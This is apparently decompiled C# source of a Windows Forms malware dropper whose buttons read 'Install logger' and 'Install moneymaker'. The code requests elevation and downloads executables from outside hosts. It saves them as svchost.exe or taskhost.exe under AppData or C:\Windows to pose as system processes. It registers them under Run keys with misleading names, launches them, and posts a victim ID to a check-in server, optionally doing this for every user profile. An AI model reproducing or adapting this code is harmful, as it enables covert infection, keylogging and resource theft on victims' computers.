using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using oahncts.My;

namespace oahncts;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Button4")]
	private Button _Button4;

	[AccessedThroughProperty("Button5")]
	private Button _Button5;

	[AccessedThroughProperty("Button6")]
	private Button _Button6;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button3_Click;
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click(eventHandler);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click(eventHandler);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Button Button4
	{
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button4_Click;
			if (_Button4 != null)
			{
				((Control)_Button4).remove_Click(eventHandler);
			}
			_Button4 = value;
			if (_Button4 != null)
			{
				((Control)_Button4).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button5
	{
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button5_Click;
			if (_Button5 != null)
			{
				((Control)_Button5).remove_Click(eventHandler);
			}
			_Button5 = value;
			if (_Button5 != null)
			{
				((Control)_Button5).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button6
	{
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button6_Click;
			if (_Button6 != null)
			{
				((Control)_Button6).remove_Click(eventHandler);
			}
			_Button6 = value;
			if (_Button6 != null)
			{
				((Control)_Button6).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		Button1 = new Button();
		Label1 = new Label();
		Button2 = new Button();
		Button3 = new Button();
		CheckBox1 = new CheckBox();
		Button4 = new Button();
		Button5 = new Button();
		Button6 = new Button();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(12, 37);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(137, 39);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Install logger");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(9, 268);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(18, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("ID");
		Button button3 = Button2;
		location = new Point(171, 83);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(137, 39);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(2);
		((ButtonBase)Button2).set_Text("Exit");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button button5 = Button3;
		location = new Point(171, 37);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(137, 40);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(3);
		((ButtonBase)Button3).set_Text("Install for all users");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(12, 238);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(76, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(4);
		((ButtonBase)CheckBox1).set_Text("http_mode");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Button button7 = Button4;
		location = new Point(12, 83);
		((Control)button7).set_Location(location);
		((Control)Button4).set_Name("Button4");
		Button button8 = Button4;
		size = new Size(137, 39);
		((Control)button8).set_Size(size);
		((Control)Button4).set_TabIndex(5);
		((ButtonBase)Button4).set_Text("Delete");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(true);
		Button button9 = Button5;
		location = new Point(12, 185);
		((Control)button9).set_Location(location);
		((Control)Button5).set_Name("Button5");
		Button button10 = Button5;
		size = new Size(137, 37);
		((Control)button10).set_Size(size);
		((Control)Button5).set_TabIndex(6);
		((ButtonBase)Button5).set_Text("Install moneymaker");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(true);
		Button button11 = Button6;
		location = new Point(171, 185);
		((Control)button11).set_Location(location);
		((Control)Button6).set_Name("Button6");
		Button button12 = Button6;
		size = new Size(137, 37);
		((Control)button12).set_Size(size);
		((Control)Button6).set_TabIndex(7);
		((ButtonBase)Button6).set_Text("Install for all users");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(340, 317);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button6);
		((Control)this).get_Controls().Add((Control)(object)Button5);
		((Control)this).get_Controls().Add((Control)(object)Button4);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void RestartElevated()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = Application.get_ExecutablePath();
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			ProjectData.ClearProjectError();
			return;
		}
		Application.Exit();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		if (MyProject.User.IsInRole((BuiltInRole)544))
		{
			Label1.set_Text("Admin mode");
			try
			{
				File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\oyxhcyv");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		else if (!File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\oyxhcyv"))
		{
			File.Create(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\oyxhcyv");
			RestartElevated();
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe"))
		{
			Interaction.MsgBox((object)"Logger already installed for current user", (MsgBoxStyle)0, (object)null);
		}
		if (File.Exists("c:\\windows\\svchost.exe"))
		{
			Interaction.MsgBox((object)"Logger already installed for all users", (MsgBoxStyle)0, (object)null);
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\Windows\\taskhost.exe"))
		{
			Interaction.MsgBox((object)"Moneymaker already installed for current user", (MsgBoxStyle)0, (object)null);
		}
		if (File.Exists("c:\\windows\\taskhost.exe"))
		{
			Interaction.MsgBox((object)"Moneymaker already installed for all users", (MsgBoxStyle)0, (object)null);
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (!CheckBox1.get_Checked())
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe"))
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe");
		}
		string text = "https://nzhjlvc.tech/a/svchost.exe";
		if (CheckBox1.get_Checked())
		{
			text = "http://nzhjlvc.tech/a/svchost.exe";
		}
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe");
		string text2 = Guid.NewGuid().ToString();
		FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\csgrgplh", FileMode.OpenOrCreate, FileAccess.Write, FileShare.None);
		StreamWriter streamWriter = new StreamWriter(fileStream);
		streamWriter.Write(text2);
		streamWriter.Close();
		fileStream.Close();
		if (CheckBox1.get_Checked())
		{
			File.Create(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\ywqidoi");
		}
		if (!File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\eudvdbjjv"))
		{
			File.Create(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\eudvdbjjv");
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Host Process for Windows Tasks", Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe");
		registryKey.Close();
		Process.Start(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe");
		if (!CheckBox1.get_Checked())
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		using (WebClient webClient = new WebClient())
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("id", text2);
			string uriString = "https://kfrrqu.tech/check_in.php";
			if (CheckBox1.get_Checked())
			{
				uriString = "http://kfrrqu.tech/check_in.php";
			}
			Uri address = new Uri(uriString);
			webClient.UploadValues(address, "POST", nameValueCollection);
		}
		Label1.set_Text(text2);
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		try
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\oyxhcyv");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		((Form)this).Close();
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (!CheckBox1.get_Checked())
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		if (File.Exists("c:\\windows\\svchost.exe"))
		{
			File.Delete("c:\\windows\\svchost.exe");
		}
		string text = "https://nzhjlvc.tech/a/svchost.exe";
		if (CheckBox1.get_Checked())
		{
			text = "http://nzhjlvc.tech/a/svchost.exe";
		}
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, "c:\\windows\\svchost.exe");
		string[] directories = Directory.GetDirectories("c:\\users");
		foreach (string text2 in directories)
		{
			try
			{
				if (File.Exists(text2 + "\\AppData\\Local\\Microsoft\\svchost.exe"))
				{
					File.Delete(text2 + "\\AppData\\Local\\Microsoft\\svchost.exe");
				}
				string text3 = Guid.NewGuid().ToString();
				FileStream fileStream = new FileStream(text2 + "\\AppData\\Local\\Microsoft\\csgrgplh", FileMode.OpenOrCreate, FileAccess.Write, FileShare.None);
				StreamWriter streamWriter = new StreamWriter(fileStream);
				streamWriter.Write(text3);
				streamWriter.Close();
				fileStream.Close();
				if (!File.Exists(text2 + "\\AppData\\Local\\Microsoft\\eudvdbjjv"))
				{
					File.Create(text2 + "\\AppData\\Local\\Microsoft\\eudvdbjjv");
				}
				if (CheckBox1.get_Checked())
				{
					File.Create(text2 + "\\AppData\\Local\\Microsoft\\ywqidoi");
				}
				using WebClient webClient = new WebClient();
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection.Add("id", "BULK:" + text3);
				string uriString = "https://kfrrqu.tech/check_in.php";
				if (CheckBox1.get_Checked())
				{
					uriString = "http://kfrrqu.tech/check_in.php";
				}
				Uri address = new Uri(uriString);
				webClient.UploadValues(address, "POST", nameValueCollection);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Host Process for Windows Tasks", "c:\\windows\\svchost.exe");
		registryKey.Close();
		Process.Start("c:\\windows\\svchost.exe");
		Label1.set_Text("Installed for all users");
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe"))
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\svchost.exe");
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\csgrgplh"))
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\csgrgplh");
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\eudvdbjjv"))
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\eudvdbjjv");
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\ywqidoi"))
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\ywqidoi");
		}
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			File.Delete("c:\\windows\\svchost.exe");
			ProjectData.ClearProjectError();
		}
	}

	private void Button5_Click(object sender, EventArgs e)
	{
		if (!CheckBox1.get_Checked())
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		if (File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\Windows\\taskhost.exe"))
		{
			File.Delete(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\Windows\\taskhost.exe");
		}
		string text = "https://nzhjlvc.tech/a/taskhost.exe";
		if (CheckBox1.get_Checked())
		{
			text = "http://nzhjlvc.tech/a/taskhost.exe";
		}
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\Windows\\taskhost.exe");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Host Process for Windows Services", Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\Windows\\taskhost.exe");
		registryKey.Close();
		Process.Start(Environment.GetEnvironmentVariable("userprofile") + "\\AppData\\Local\\Microsoft\\Windows\\taskhost.exe");
		Label1.set_Text("Moneymaker installed");
	}

	private void Button6_Click(object sender, EventArgs e)
	{
		if (!CheckBox1.get_Checked())
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		if (File.Exists("c:\\windows\\taskhost.exe"))
		{
			File.Delete("c:\\windows\\taskhost.exe");
		}
		string text = "https://nzhjlvc.tech/a/taskhost.exe";
		if (CheckBox1.get_Checked())
		{
			text = "http://nzhjlvc.tech/a/taskhost.exe";
		}
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, "c:\\windows\\taskhost.exe");
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Host Process for Windows Services", "c:\\windows\\taskhost.exe");
		registryKey.Close();
		Process.Start("c:\\windows\\taskhost.exe");
		Label1.set_Text("Moneymaker installed for all users");
	}
}
